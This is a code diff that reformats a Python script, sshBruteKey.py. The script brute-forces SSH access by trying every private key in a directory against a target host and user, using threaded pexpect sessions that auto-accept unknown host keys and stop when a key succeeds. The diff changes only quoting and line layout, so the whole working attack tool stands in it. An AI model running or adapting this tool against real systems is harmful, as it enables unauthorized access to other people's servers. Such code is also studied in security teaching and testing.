@@ -5,10 +5,10 @@
 # example: sshBruteKey.py
 
 
-'''
+"""
 TODO: pxssh vs Fabric vs pexpect vs subprocess
 TODO: Migrate to Object Oriented
-'''
+"""
 
 import pexpect
 import argparse
@@ -25,24 +25,24 @@ def connect(host, user, keyfile, release):
     global Stop
     global Fails
     try:
-        perm_denied = 'Permission denied'
-        ssh_newkey = 'Are you sure you want to continue'
-        conn_closed = 'Connection closed by remote host'
-        opt = ' -o PasswordAuthentication=no'
-        connStr = 'ssh ' + user + \
-                '@' + host + ' -i' + keyfile + opt
+        perm_denied = "Permission denied"
+        ssh_newkey = "Are you sure you want to continue"
+        conn_closed = "Connection closed by remote host"
+        opt = " -o PasswordAuthentication=no"
+        connStr = "ssh " + user + "@" + host + " -i" + keyfile + opt
         child = pexpect.spawn(connStr)
-        ret = child.expect([pexpect.TIMEOUT, perm_denied, \
-                ssh_newkey, conn_closed, '$', '#', ])
+        ret = child.expect(
+            [pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, "$", "#",]
+        )
         if ret == 2:
-            print('[-] Adding host to ~/.ssh/known_hosts')
-            child.sendline('yes')
+            print("[-] Adding host to ~/.ssh/known_hosts")
+            child.sendline("yes")
             connect(user, host, keyfile, False)
         elif ret == 3:
-            print('[-] Connection closed by remote host')
+            print("[-] Connection closed by remote host")
             Fails += 1
         elif ret > 3:
-            print('[+] Success. ' + str(keyfile))
+            print("[+] Success. " + str(keyfile))
             Stop = True
     finally:
         if release:
@@ -51,9 +51,19 @@ def connect(host, user, keyfile, release):
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--host',nargs='?', action="store", dest="host", help="Target host")
-    parser.add_argument('--user',nargs='?', action="store", dest="user", help="Target username")
-    parser.add_argument('--dir',nargs='?', action="store", dest="directory", help="ssh private key directory")
+    parser.add_argument(
+        "--host", nargs="?", action="store", dest="host", help="Target host"
+    )
+    parser.add_argument(
+        "--user", nargs="?", action="store", dest="user", help="Target username"
+    )
+    parser.add_argument(
+        "--dir",
+        nargs="?",
+        action="store",
+        dest="directory",
+        help="ssh private key directory",
+    )
 
     args = parser.parse_args()
 
@@ -66,18 +76,19 @@ def main():
 
     for filename in os.listdir(directory):
         if Stop:
-            print(f'[*] Exiting: Key Found.')
+            print(f"[*] Exiting: Key Found.")
             exit(0)
         if Fails > 5:
-            print(f'[!] Exiting: Too Many Connections Closed by Remote Host.')
-            print(f'[!] Adjust number of simultaneous threads.')
+            print(f"[!] Exiting: Too Many Connections Closed by Remote Host.")
+            print(f"[!] Adjust number of simultaneous threads.")
             exit(0)
         connection_lock.acquire()
         fullpath = os.path.join(directory, filename)
-        print(f'[-] Testing keyfile {fullpath}')
+        print(f"[-] Testing keyfile {fullpath}")
         t = Thread(target=connect, args=(user, host, fullpath, True))
         child = t.start()
     child.join()
+
 
 if __name__ == "__main__":
     main()
